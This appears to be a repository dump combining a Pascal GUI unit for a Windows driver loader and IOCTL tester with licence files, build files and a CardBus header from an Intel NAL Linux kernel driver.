procedure TMainForm.CheckBoxSymLinkClick(Sender: TObject);
begin
  EditNativeSymLink.Enabled := CheckBoxSymLink.Checked;
end;

procedure TMainForm.CheckBoxUseFilesChange(Sender: TObject);
begin
  EditInBufferName.Enabled := CheckBoxUseFiles.Checked;
  EditOutBufferName.Enabled := CheckBoxUseFiles.Checked;
  ButtonInBufferBrowse.Enabled := CheckBoxUseFiles.Checked;
  ButtonOutBufferBrowse.Enabled := CheckBoxUseFiles.Checked;
end;

procedure TMainForm.EditDevTypeKeyUp(Sender: TObject; var Key: word;
  Shift: TShiftState);
begin
  BuildIoctl(Sender);
end;

procedure TMainForm.EditIoCtlCodeKeyPress(Sender: TObject; var Key: char);
begin
  if not (Key in [#8, #22, 'a'..'f', 'A'..'F', '0'..'9']) then
  begin
    Key := #0;
  end;
end;

procedure TMainForm.EditIoctlValueChange(Sender: TObject);
var
  S: string;
  ioctl, method, access: DWORD;
begin
  try
    S := EditIoctlValue.Text;

    ioctl := HexToDword(S);
    access := (ioctl and $c000) shr 14;
    method := (ioctl and $3);

    if (access > DWORD(ComboBoxIoAccess.Items.Count)) then
    begin
      ShowMessage('Invalid access value in supplied IOCTL');
      exit;
    end;

    ComboBoxIoAccess.ItemIndex := access;

    if (method > DWORD(ComboBoxIoMethod.Items.Count)) then
    begin
      ShowMessage('Invalid method value in supplied IOCTL');
      exit;
    end;

    ComboBoxIoMethod.ItemIndex := method;

    EditFunctionId.Text := Format('%x', [(ioctl and $3ffc) shr 2]);
    EditDevType.Text := Format('%x', [(ioctl and $ffff0000) shr 16]);
  except

    on E: Exception do
    begin
      PrintToLog(E.Message);
    end;

  end;
end;

procedure TMainForm.FormCreate(Sender: TObject);
var
  i: integer;
  ChangeWindowMessageFilter: TChangeWindowMessageFilter;
  hUser32: Thandle;
const
  MSGFLT_ADD = 1;
  WM_COPYGLOBALDATA = 73;
begin

  try
    i := 0;
    if (ParamCount > 0) then
      i := StrToInt(ParamStr(1));

    if (i < PageControl1.PageCount) then
      PageControl1.ActivePageIndex := i
    else
      PageControl1.ActivePage := ScmTabSheet;

  except
    PageControl1.ActivePage := ScmTabSheet;
  end;

  IsFullAdmin := IsCurrentUserFullAdmin();
  if (not IsFullAdmin) then
  begin
    SendMessage(ButtonNativeInstall.Handle, BCM_SETSHIELD, WParam(0), LParam(True));
    SendMessage(ButtonNativeLoad.Handle, BCM_SETSHIELD, WParam(0), LParam(True));
    SendMessage(ButtonNativeUnload.Handle, BCM_SETSHIELD, WParam(0), LParam(True));
    SendMessage(ButtonNativeRemove.Handle, BCM_SETSHIELD, WParam(0), LParam(True));

    ButtonNativeInstall.OnClick := @ElevateButtonClick;
    ButtonNativeLoad.OnClick := @ElevateButtonClick;
    ButtonNativeUnload.OnClick := @ElevateButtonClick;
    ButtonNativeRemove.OnClick := @ElevateButtonClick;
  end
  else
  begin
    MainForm.Caption := MainForm.Caption + ' (elevated)';
  end;


  // Fix for elevation.

  hUser32 := LoadLibrary('user32.dll');
  if (hUser32 <> 0) then
  begin
    ChangeWindowMessageFilter :=
      TChangeWindowMessageFilter(GetProcAddress(hUser32, 'ChangeWindowMessageFilter'));
    if Assigned(ChangeWindowMessageFilter) then
    begin
      ChangeWindowMessageFilter(WM_DROPFILES, MSGFLT_ADD);
      ChangeWindowMessageFilter(WM_COPYGLOBALDATA, MSGFLT_ADD);
    end;
  end;

end;

procedure TMainForm.FormDropFiles(Sender: TObject; const FileNames: array of string);
var
  l: integer;
  drvName, drvNameNotExt: string;
begin
  l := Length(FileNames);
  if (l > 0) then
  begin

    drvName := ExtractFileName(FileNames[0]);
    drvNameNotExt := ExtractFileNameWithoutExt(drvName);
    if (PageControl1.ActivePage = ScmTabSheet) then
    begin
      EditScmFileName.Text := FileNames[0];
      if (EditScmDisplayName.Text = '') then
        EditScmDisplayName.Text := drvName;
      if (EditScmName.Text = '') then
        EditScmName.Text := drvNameNotExt;
    end
    else
    if (PageControl1.ActivePage = NativeTabSheet) then
    begin
      EditNativeFileName.Text := FileNames[0];
      if (EditNativeDisplayName.Text = '') then
        EditNativeDisplayName.Text := drvName;
      if (EditNativeName.Text = '') then
        EditNativeName.Text := drvNameNotExt;
    end;

  end;
end;

procedure TMainForm.Image1Click(Sender: TObject);
begin

end;

procedure TMainForm.IoctlSheetShow(Sender: TObject);
var
  usTypeName: UNICODE_STRING;
  enumContext: EnumObjectsContext;
begin
  EditDeviceName.Items.Clear();
  RtlInitUnicodeString(@usTypeName, PWideChar(OBJECT_TYPE_DEVICE));

  enumContext.UserContext := @usTypeName;
  enumContext.ObjectPathName := nil;

  ntsupEnumerateObjects(PwideChar('\'), PEnumObjectsCallback(@ObjectEnumProc),
    @enumContext);

  if (EditDeviceName.Items.Count > 0) then
    EditDeviceName.ItemIndex := 0;
end;

function EnablePrivilegeByName(lpPrivilegeName: LPCTSTR; fEnable: boolean): DWORD;

var
  TokenHandle: THANDLE;
  TokenPriv: TOKEN_PRIVILEGES;
  PrevTokenPriv: TOKEN_PRIVILEGES;
  ReturnLength: cardinal;
begin
  Result := ERROR_PRIVILEGE_NOT_HELD;
  TokenHandle := 0;
  if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES or
    TOKEN_QUERY, TokenHandle) then
  begin
    try
      TokenPriv.Privileges[0].Luid := 0;

      if LookupPrivilegeValue(nil, lpPrivilegeName,
        TokenPriv.Privileges[0].Luid) then
      begin

        TokenPriv.PrivilegeCount := 1;

        if fEnable then
          TokenPriv.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED
        else
          TokenPriv.Privileges[0].Attributes := 0;

        ReturnLength := 0;

        PrevTokenPriv := TokenPriv;

        AdjustTokenPrivileges(TokenHandle, False, TokenPriv,
          SizeOf(TokenPriv), PrevTokenPriv, ReturnLength);
        Result := GetLastError();

      end
      else
      begin
        Result := GetLastError();
      end;

    finally
      CloseHandle(TokenHandle);
    end;
  end
  else
  begin
    Result := GetLastError();
  end;

end;

procedure TMainForm.ListViewPrivSetMouseDown(Sender: TObject;
  Button: TMouseButton; Shift: TShiftState; X, Y: integer);
var
  Item: TListItem;
  Status: DWORD;
begin
  if Button = mbLeft then
    with Sender as TListView do
    begin
      Item := GetItemAt(X, Y);
      if Assigned(Item) then
        if htOnStateIcon in GetHitTestInfoAt(X, Y) then
        begin
          Status := EnablePrivilegeByName(PChar(Item.Caption), Item.Checked);
          if (Status <> ERROR_SUCCESS) then
          begin
            Item.Checked := not Item.Checked;
            if (Status = ERROR_NOT_ALL_ASSIGNED) then
              PrintToLog(PChar(Item.Caption) +
                ': The token does not have the specified privilege.')
            else
              ShowStatus(Status);
          end;
        end;
    end;
end;

procedure TMainForm.NativeTabSheetHide(Sender: TObject);
var
  oldValue: boolean;
begin
  oldValue := False;
  RtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE, False, False, oldValue);
end;

procedure TMainForm.NativeTabSheetShow(Sender: TObject);
var
  Status: NTSTATUS;
  oldValue: boolean;
begin
  if (not IsFullAdmin) then
  begin
    LabelPrivInfo.Caption :=
      'Hint: Elevation is required to access this page';
  end
  else
  begin

    oldValue := False;
    Status := RtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE, True, False, oldValue);
    if not NT_SUCCESS(Status) then
    begin
      PrintToLog('Could not adjust SeLoadDriverPrivilege');
      ShowStatus(Status);
    end
    else
      LabelPrivInfo.Caption :=
        'Hint: SeLoadDriverPrivilege is auto adjusted when this this page is shown';

  end;
end;

procedure TMainForm.OptionsSheetShow(Sender: TObject);
var
  TokenHandle: THANDLE;
  TokenPriv: PRIVILEGE_SET;
  i: integer;
  fResult: boolean;
begin
  TokenHandle := 0;
  if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, TokenHandle) then
  begin

    for i := 0 to ListViewPrivSet.Items.Count - 1 do
    begin

      TokenPriv.Privilege[0].Luid := 0;

      if (LookupPrivilegeValue(nil, PChar(ListViewPrivSet.Items[i].Caption),
        TokenPriv.Privilege[0].Luid)) then
      begin
        TokenPriv.Control := 0;
        TokenPriv.PrivilegeCount := 1;
        TokenPriv.Privilege[0].Attributes := SE_PRIVILEGE_ENABLED;
        fResult := False;
        if (PrivilegeCheck(TokenHandle, @TokenPriv, @fResult)) then
        begin
          ListViewPrivSet.Items[i].StateIndex := integer(fResult);
        end;

      end;

    end;

    CloseHandle(TokenHandle);
  end;

end;

procedure TMainForm.ScmTabSheetShow(Sender: TObject);
begin
  if (not IsFullAdmin) then
  begin
    LabelPrivInfoScm.Caption :=
      'Hint: Elevation is required to access this page';

    SendMessage(ButtonScmInstall.Handle, BCM_SETSHIELD, WParam(0), LParam(True));
    SendMessage(ButtonScmLoad.Handle, BCM_SETSHIELD, WParam(0), LParam(True));
    SendMessage(ButtonScmUnload.Handle, BCM_SETSHIELD, WParam(0), LParam(True));
    SendMessage(ButtonScmRemove.Handle, BCM_SETSHIELD, WParam(0), LParam(True));

    ButtonScmInstall.OnClick := @ElevateButtonClick;
    ButtonScmLoad.OnClick := @ElevateButtonClick;
    ButtonScmUnload.OnClick := @ElevateButtonClick;
    ButtonScmRemove.OnClick := @ElevateButtonClick;
  end
  else
  begin
    LabelPrivInfoScm.Caption := '';
  end;
end;

end.

```

`source/IntelNal/COPYING`:

```

"This software program is licensed subject to the GNU General Public License
(GPL). Version 2, June 1991, available at
<http://www.fsf.org/copyleft/gpl.html>"

GNU General Public License

Version 2, June 1991

Copyright (C) 1989, 1991 Free Software Foundation, Inc.
59 Temple Place - Suite 330, Boston, MA  02111-1307, USA

Everyone is permitted to copy and distribute verbatim copies of this license
document, but changing it is not allowed.

Preamble

The licenses for most software are designed to take away your freedom to
share and change it. By contrast, the GNU General Public License is intended
to guarantee your freedom to share and change free software--to make sure
the software is free for all its users. This General Public License applies
to most of the Free Software Foundation's software and to any other program
whose authors commit to using it. (Some other Free Software Foundation
software is covered by the GNU Library General Public License instead.) You
can apply it to your programs, too.

When we speak of free software, we are referring to freedom, not price. Our
General Public Licenses are designed to make sure that you have the freedom
to distribute copies of free software (and charge for this service if you
wish), that you receive source code or can get it if you want it, that you
can change the software or use pieces of it in new free programs; and that
you know you can do these things.

To protect your rights, we need to make restrictions that forbid anyone to
deny you these rights or to ask you to surrender the rights. These
restrictions translate to certain responsibilities for you if you distribute
copies of the software, or if you modify it.

For example, if you distribute copies of such a program, whether gratis or
for a fee, you must give the recipients all the rights that you have. You
must make sure that they, too, receive or can get the source code. And you
must show them these terms so they know their rights.

We protect your rights with two steps: (1) copyright the software, and (2)
offer you this license which gives you legal permission to copy, distribute
and/or modify the software.

Also, for each author's protection and ours, we want to make certain that
everyone understands that there is no warranty for this free software. If
the software is modified by someone else and passed on, we want its
recipients to know that what they have is not the original, so that any
problems introduced by others will not reflect on the original authors'
reputations.

Finally, any free program is threatened constantly by software patents. We
wish to avoid the danger that redistributors of a free program will
individually obtain patent licenses, in effect making the program
proprietary. To prevent this, we have made it clear that any patent must be
licensed for everyone's free use or not licensed at all.

The precise terms and conditions for copying, distribution and modification
follow.

TERMS AND CONDITIONS FOR COPYING, DISTRIBUTION AND MODIFICATION

0. This License applies to any program or other work which contains a notice
   placed by the copyright holder saying it may be distributed under the
   terms of this General Public License. The "Program", below, refers to any
   such program or work, and a "work based on the Program" means either the
   Program or any derivative work under copyright law: that is to say, a
   work containing the Program or a portion of it, either verbatim or with
   modifications and/or translated into another language. (Hereinafter,
   translation is included without limitation in the term "modification".)
   Each licensee is addressed as "you".

   Activities other than copying, distribution and modification are not
   covered by this License; they are outside its scope. The act of running
   the Program is not restricted, and the output from the Program is covered
   only if its contents constitute a work based on the Program (independent
   of having been made by running the Program). Whether that is true depends
   on what the Program does.

1. You may copy and distribute verbatim copies of the Program's source code
   as you receive it, in any medium, provided that you conspicuously and
   appropriately publish on each copy an appropriate copyright notice and
   disclaimer of warranty; keep intact all the notices that refer to this
   License and to the absence of any warranty; and give any other recipients
   of the Program a copy of this License along with the Program.

   You may charge a fee for the physical act of transferring a copy, and you
   may at your option offer warranty protection in exchange for a fee.

2. You may modify your copy or copies of the Program or any portion of it,
   thus forming a work based on the Program, and copy and distribute such
   modifications or work under the terms of Section 1 above, provided that
   you also meet all of these conditions:

   * a) You must cause the modified files to carry prominent notices stating
        that you changed the files and the date of any change.

   * b) You must cause any work that you distribute or publish, that in
        whole or in part contains or is derived from the Program or any part
        thereof, to be licensed as a whole at no charge to all third parties
        under the terms of this License.

   * c) If the modified program normally reads commands interactively when
        run, you must cause it, when started running for such interactive
        use in the most ordinary way, to print or display an announcement
        including an appropriate copyright notice and a notice that there is
        no warranty (or else, saying that you provide a warranty) and that
        users may redistribute the program under these conditions, and
        telling the user how to view a copy of this License. (Exception: if
        the Program itself is interactive but does not normally print such
        an announcement, your work based on the Program is not required to
        print an announcement.)

   These requirements apply to the modified work as a whole. If identifiable
   sections of that work are not derived from the Program, and can be
   reasonably considered independent and separate works in themselves, then
   this License, and its terms, do not apply to those sections when you
   distribute them as separate works. But when you distribute the same
   sections as part of a whole which is a work based on the Program, the
   distribution of the whole must be on the terms of this License, whose
   permissions for other licensees extend to the entire whole, and thus to
   each and every part regardless of who wrote it.

   Thus, it is not the intent of this section to claim rights or contest
   your rights to work written entirely by you; rather, the intent is to
   exercise the right to control the distribution of derivative or
   collective works based on the Program.

   In addition, mere aggregation of another work not based on the Program
   with the Program (or with a work based on the Program) on a volume of a
   storage or distribution medium does not bring the other work under the
   scope of this License.

3. You may copy and distribute the Program (or a work based on it, under
   Section 2) in object code or executable form under the terms of Sections
   1 and 2 above provided that you also do one of the following:

   * a) Accompany it with the complete corresponding machine-readable source
        code, which must be distributed under the terms of Sections 1 and 2
        above on a medium customarily used for software interchange; or,

   * b) Accompany it with a written offer, valid for at least three years,
        to give any third party, for a charge no more than your cost of
        physically performing source distribution, a complete machine-
        readable copy of the corresponding source code, to be distributed
        under the terms of Sections 1 and 2 above on a medium customarily
        used for software interchange; or,

   * c) Accompany it with the information you received as to the offer to
        distribute corresponding source code. (This alternative is allowed
        only for noncommercial distribution and only if you received the
        program in object code or executable form with such an offer, in
        accord with Subsection b above.)

   The source code for a work means the preferred form of the work for
   making modifications to it. For an executable work, complete source code
   means all the source code for all modules it contains, plus any
   associated interface definition files, plus the scripts used to control
   compilation and installation of the executable. However, as a special
   exception, the source code distributed need not include anything that is
   normally distributed (in either source or binary form) with the major
   components (compiler, kernel, and so on) of the operating system on which
   the executable runs, unless that component itself accompanies the
   executable.

   If distribution of executable or object code is made by offering access
   to copy from a designated place, then offering equivalent access to copy
   the source code from the same place counts as distribution of the source
   code, even though third parties are not compelled to copy the source
   along with the object code.

4. You may not copy, modify, sublicense, or distribute the Program except as
   expressly provided under this License. Any attempt otherwise to copy,
   modify, sublicense or distribute the Program is void, and will
   automatically terminate your rights under this License. However, parties
   who have received copies, or rights, from you under this License will not
   have their licenses terminated so long as such parties remain in full
   compliance.

5. You are not required to accept this License, since you have not signed
   it. However, nothing else grants you permission to modify or distribute
   the Program or its derivative works. These actions are prohibited by law
   if you do not accept this License. Therefore, by modifying or
   distributing the Program (or any work based on the Program), you
   indicate your acceptance of this License to do so, and all its terms and
   conditions for copying, distributing or modifying the Program or works
   based on it.

6. Each time you redistribute the Program (or any work based on the
   Program), the recipient automatically receives a license from the
   original licensor to copy, distribute or modify the Program subject to
   these terms and conditions. You may not impose any further restrictions
   on the recipients' exercise of the rights granted herein. You are not
   responsible for enforcing compliance by third parties to this License.

7. If, as a consequence of a court judgment or allegation of patent
   infringement or for any other reason (not limited to patent issues),
   conditions are imposed on you (whether by court order, agreement or
   otherwise) that contradict the conditions of this License, they do not
   excuse you from the conditions of this License. If you cannot distribute
   so as to satisfy simultaneously your obligations under this License and
   any other pertinent obligations, then as a consequence you may not
   distribute the Program at all. For example, if a patent license would
   not permit royalty-free redistribution of the Program by all those who
   receive copies directly or indirectly through you, then the only way you
   could satisfy both it and this License would be to refrain entirely from
   distribution of the Program.

   If any portion of this section is held invalid or unenforceable under any
   particular circumstance, the balance of the section is intended to apply
   and the section as a whole is intended to apply in other circumstances.

   It is not the purpose of this section to induce you to infringe any
   patents or other property right claims or to contest validity of any
   such claims; this section has the sole purpose of protecting the
   integrity of the free software distribution system, which is implemented
   by public license practices. Many people have made generous contributions
   to the wide range of software distributed through that system in
   reliance on consistent application of that system; it is up to the
   author/donor to decide if he or she is willing to distribute software
   through any other system and a licensee cannot impose that choice.

   This section is intended to make thoroughly clear what is believed to be
   a consequence of the rest of this License.

8. If the distribution and/or use of the Program is restricted in certain
   countries either by patents or by copyrighted interfaces, the original
   copyright holder who places the Program under this License may add an
   explicit geographical distribution limitation excluding those countries,
   so that distribution is permitted only in or among countries not thus
   excluded. In such case, this License incorporates the limitation as if
   written in the body of this License.

9. The Free Software Foundation may publish revised and/or new versions of
   the General Public License from time to time. Such new versions will be
   similar in spirit to the present version, but may differ in detail to
   address new problems or concerns.

   Each version is given a distinguishing version number. If the Program
   specifies a version number of this License which applies to it and "any
   later version", you have the option of following the terms and
   conditions either of that version or of any later version published by
   the Free Software Foundation. If the Program does not specify a version
   number of this License, you may choose any version ever published by the
   Free Software Foundation.

10. If you wish to incorporate parts of the Program into other free programs
    whose distribution conditions are different, write to the author to ask
    for permission. For software which is copyrighted by the Free Software
    Foundation, write to the Free Software Foundation; we sometimes make
    exceptions for this. Our decision will be guided by the two goals of
    preserving the free status of all derivatives of our free software and
    of promoting the sharing and reuse of software generally.

   NO WARRANTY

11. BECAUSE THE PROGRAM IS LICENSED FREE OF CHARGE, THERE IS NO WARRANTY
    FOR THE PROGRAM, TO THE EXTENT PERMITTED BY APPLICABLE LAW. EXCEPT WHEN
    OTHERWISE STATED IN WRITING THE COPYRIGHT HOLDERS AND/OR OTHER PARTIES
    PROVIDE THE PROGRAM "AS IS" WITHOUT WARRANTY OF ANY KIND, EITHER
    EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
    WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE. THE
    ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM IS WITH
    YOU. SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF ALL
    NECESSARY SERVICING, REPAIR OR CORRECTION.

12. IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING
    WILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MAY MODIFY AND/OR
    REDISTRIBUTE THE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR
    DAMAGES, INCLUDING ANY GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL
    DAMAGES ARISING OUT OF THE USE OR INABILITY TO USE THE PROGRAM
    (INCLUDING BUT NOT LIMITED TO LOSS OF DATA OR DATA BEING RENDERED
    INACCURATE OR LOSSES SUSTAINED BY YOU OR THIRD PARTIES OR A FAILURE OF
    THE PROGRAM TO OPERATE WITH ANY OTHER PROGRAMS), EVEN IF SUCH HOLDER OR
    OTHER PARTY HAS BEEN ADVISED OF THE POSSIBILITY OF SUCH DAMAGES.

END OF TERMS AND CONDITIONS

How to Apply These Terms to Your New Programs

If you develop a new program, and you want it to be of the greatest
possible use to the public, the best way to achieve this is to make it free
software which everyone can redistribute and change under these terms.

To do so, attach the following notices to the program. It is safest to
attach them to the start of each source file to most effectively convey the
exclusion of warranty; and each file should have at least the "copyright"
line and a pointer to where the full notice is found.

one line to give the program's name and an idea of what it does.
Copyright (C) yyyy  name of author

This program is free software; you can redistribute it and/or modify it
under the terms of the GNU General Public License as published by the Free
Software Foundation; either version 2 of the License, or (at your option)
any later version.

This program is distributed in the hope that it will be useful, but WITHOUT
ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for
more details.

You should have received a copy of the GNU General Public License along with
this program; if not, write to the Free Software Foundation, Inc., 59
Temple Place - Suite 330, Boston, MA  02111-1307, USA.

Also add information on how to contact you by electronic and paper mail.

If the program is interactive, make it output a short notice like this when
it starts in an interactive mode:

Gnomovision version 69, Copyright (C) year name of author Gnomovision comes
with ABSOLUTELY NO WARRANTY; for details type 'show w'.  This is free
software, and you are welcome to redistribute it under certain conditions;
type 'show c' for details.

The hypothetical commands 'show w' and 'show c' should show the appropriate
parts of the General Public License. Of course, the commands you use may be
called something other than 'show w' and 'show c'; they could even be
mouse-clicks or menu items--whatever suits your program.

You should also get your employer (if you work as a programmer) or your
school, if any, to sign a "copyright disclaimer" for the program, if
necessary. Here is a sample; alter the names:

Yoyodyne, Inc., hereby disclaims all copyright interest in the program
'Gnomovision' (which makes passes at compilers) written by James Hacker.

signature of Ty Coon, 1 April 1989
Ty Coon, President of Vice

This General Public License does not permit incorporating your program into
proprietary programs. If your program is a subroutine library, you may
consider it more useful to permit linking proprietary applications with the
library. If this is what you want to do, use the GNU Library General Public
License instead of this License.

```

`source/IntelNal/Kconfig`:

```
config INTEL_IQVANDROID
        tristate "iqvandroid kernel driver for BYT MFG tools"
        default n
        help
           Select this module for support BYT MFG tools.


```

`source/IntelNal/Makefile`:

```
iqvandroid-objs := \
	src/linuxnaldriver.o \
	src/linuxdriverpci_i.o \
	src/linuxdriveros_i.o \
	src/linuxdriverdevice_i.o \
	src/nalioctldrv.o

EXTRA_CFLAGS := \
	-DNAL_LINUX -DNAL_LINUX_ANDROID -DNAL_DRIVER -DLINUX -D__KERNEL__ -DMODULE \
	-Idrivers/external_drivers/drivers/misc/iqvandroid/inc/ \
	-Idrivers/external_drivers/drivers/misc/iqvandroid/inc/linux \

obj-$(CONFIG_INTEL_IQVANDROID) = iqvandroid.o

```

`source/IntelNal/README.md`:

```md
Intel QV Linux kernel driver, see COPYING for more info

```

`source/IntelNal/inc/cardbus_t.h`:

```h
/*

  This file is provided under a dual BSD/GPLv2 license.  When using or
  redistributing this file, you may do so under either license.

  GPL LICENSE SUMMARY

  Copyright(c) 1999 - 2013 Intel Corporation. All rights reserved.

  This program is free software; you can redistribute it and/or modify
  it under the terms of version 2 of the GNU General Public License as
  published by the Free Software Foundation.

  This program is distributed in the hope that it will be useful, but
  WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
  General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program; if not, write to the Free Software
  Foundation, Inc., 51 Franklin St - Fifth Floor, Boston, MA 02110-1301 USA.
  The full GNU General Public License is included in this distribution
  in the file called LICENSE.GPL.

  Contact Information:
  e1000-devel Mailing List <e1000-devel@lists.sourceforge.net>
  Intel Corporation, 5200 N.E. Elam Young Parkway, Hillsboro, OR 97124-6497

  BSD LICENSE

  Copyright(c) 1999 - 2013 Intel Corporation. All rights reserved.
  All rights reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions
  are met:

    * Redistributions of source code must retain the above copyright
      notice, this list of conditions and the following disclaimer.
    * Redistributions in binary form must reproduce the above copyright
      notice, this list of conditions and the following disclaimer in
      the documentation and/or other materials provided with the
      distribution.
    * Neither the name of Intel Corporation nor the names of its
      contributors may be used to endorse or promote products derived
      from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
  "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
  LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
  A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
  OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
  SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
  LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
  DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
  THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

*/

/*
 *
 * Module Name:
 *   cardbus_t.h
 *
 * Abstract:
 *   This file contains NAL Cardbus data types.
 *
 */


#include <naltypes.h>

#ifndef _CARDBUS_H_
#define _CARDBUS_H_

#define CARDBUS_0 (1 << 31)

#pragma pack(1)

typedef union _CARDBUS_SLOT_ID
{
    UINT32 SlotId;
#if defined(NAL_BIG_ENDIAN)
    struct _CARDBUS_PARTS
    {
        UINT32 Reserved : 7;
        UINT32 Enable : 1;
        UINT32 Bus : 8;
        UINT32 Function : 3;
        UINT32 Device : 5;
        UINT32 _Byte : 2;
        UINT32 Dword : 6;
    } CARDBUS_PARTS;
#else
    struct _CARDBUS_PARTS
    {
        UINT32 _Byte : 2;
        UINT32 Dword : 6;
        UINT32 Function : 3;
        UINT32 Device : 5;
        UINT32 Bus : 8;
        UINT32 Reserved : 7;
        UINT32 Enable : 1;
    } CARDBUS_PARTS;
#endif
} CARDBUS_SLOT_ID;

typedef union _CARDBUS_CIS_POINTER
{
    UINT32 CISPointer;
    struct _CARDBUS_CIS_POINTER_REGISTER
    {

        UINT32 AddressSpaceIndicator : 3;

        UINT32 AddressSpaceOffset : 25;

        UINT32 ROMImage : 4;

    } CARDBUS_CIS_POINTER_REGISTER;
} CARDBUS_CIS_POINTER;

typedef struct _CARDBUS_DEVICE
{
    UINT32 Reserved;
    UINT16 CommandRegister;
    UINT16 StatusRegister;
    UINT32 Reserved1;
    UINT8 CacheLineSize;
    UINT8 LatencyTimer;
    UINT8 HeaderType;
    UINT8 Bist;
    UINT32 Bar0;
    UINT32 Bar1;
    UINT32 Bar2;
    UINT32 Bar3;
    UINT32 Bar4;
    UINT32 Bar5;
    UINT32 CardBusCisPointer;
    UINT32 Reserved2;
    UINT32 ExpansionRomBaseAddress;
    UINT32 Reserved3;
    UINT32 Reserved4;
    UINT8 Reserved5;
    UINT8 InterruptPin;
    UINT16 Reserved6;
} CARDBUS_DEVICE;

typedef struct _CARDBUS_BRIDGE
{
    UINT16 VendorId;
    UINT16 DeviceId;
    UINT16 CommandRegister;
    UINT16 StatusRegister;
    UINT8 RevisionId;
    UINT8 ProgIf;
    UINT8 SubclassCode;
    UINT8 ClassCode;
    UINT8 CacheLineSize;
    UINT8 LatencyTimer;
    UINT8 HeaderType;
    UINT8 Bist;
    UINT8 PciBusNumber;
    UINT8 CardbusBusNumber;
    UINT8 SubordinateBusNumber;
    UINT8 CardbusLatencyTimer;
    UINT32 Bar0;
    UINT32 Limit0;
    UINT32 Bar1;
    UINT32 Limit1;
    UINT16 IoBaseRegister0Lower;
    UINT16 IoBaseRegister0OptionalUpper;
    UINT16 IoLimitRegister0Lower;
    UINT16 IoLimitRegiseter0OptionalUpper;
    UINT16 IoBaseRegister1Lower;
    UINT16 IoBaseRegister1OptionalUpper;
    UINT16 IoLimitRegister1Lower;
    UINT16 IoLimitRegiseter1OptionalUpper;
    UINT8 InterruptLine;
    UINT8 InterruptPin;
    UINT16 BridgeControl;
    UINT16 SubsystemVendorId;
    UINT16 SubsystemId;
    UINT32 Optional16BitPcCardBaseAddress;
} CARDBUS_BRIDGE;

#pragma pack()
#endif

```

`source/IntelNal/inc/files.txt`:

```txt
This file describes in details which file in this folder is released under which license.
Full content of lincese is placed below the files' list.

cardbus_t.h		- GPLv2/BSD
hwbus_t.h		- GPLv2/BSD
nal.h			- GPLv2/BSD
nalcodes.h		- GPLv2/BSD
nalioctl.h		- GPLv2/BSD
naltypes.h		- GPLv2/BSD
os_i.h			- GPLv2/BSD
osdevice_i.h		- GPLv2/BSD
pci_i.h			- GPLv2/BSD
pci_t.h			- GPLv2/BSD

  GPL LICENSE SUMMARY
  -------------------

  Copyright(c) 1999 - 2013 Intel Corporation. All rights reserved.

  This program is free software; you can redistribute it and/or modify
  it under the terms of version 2 of the GNU General Public License as
  published by the Free Software Foundation.

  This program is distributed in the hope that it will be useful, but
  WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
  General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program; if not, write to the Free Software
  Foundation, Inc., 51 Franklin St - Fifth Floor, Boston, MA 02110-1301 USA.
  The full GNU General Public License is included in this distribution
  in the file called LICENSE.GPL.

  Contact Information:
  e1000-devel Mailing List <e1000-devel@lists.sourceforge.net>
  Intel Corporation, 5200 N.E. Elam Young Parkway, Hillsboro, OR 97124-6497

  BSD LICENSE
  -----------

  Copyright(c) 1999 - 2013 Intel Corporation. All rights reserved.
  All rights reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions
  are met:

    * Redistributions of source code must retain the above copyright
      notice, this list of conditions and the following disclaimer.
    * Redistributions in binary form must reproduce the above copyright
      notice, this list of conditions and the following disclaimer in
      the documentation and/or other materials provided with the
      distribution.
    * Neither the name of Intel Corporation nor the names of its
      contributors may be used to endorse or promote products derived
      from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
  "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
  LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
  A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
